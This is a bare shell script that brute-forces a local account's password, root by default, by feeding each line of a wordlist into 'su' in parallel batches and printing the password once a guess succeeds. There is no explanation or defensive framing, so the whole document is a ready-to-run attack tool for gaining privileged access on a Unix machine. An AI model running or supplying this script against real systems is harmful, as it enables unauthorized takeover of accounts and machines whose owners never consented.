#!/bin/sh
U=${1:-"root"}
D=${2:-"dict.txt"}
T=$(wc -l < "$D")
C=0

while IFS= read -r p; do
    C=$((C + 1))
    printf "\r\033[K[*] Progress: [%d/%d] %s" "$C" "$T" "$p"
    
    (echo "$p" | timeout 0.2 su "$U" -c "whoami" 2>/dev/null | grep -q "$U") 2>/dev/null && {
        printf "\n[+] FOUND => %s\n" "$p"
        kill -9 $$
    } &

    [ $((C % 16)) -eq 0 ] && wait
done < "$D"

wait
echo -e "\n[-] End"
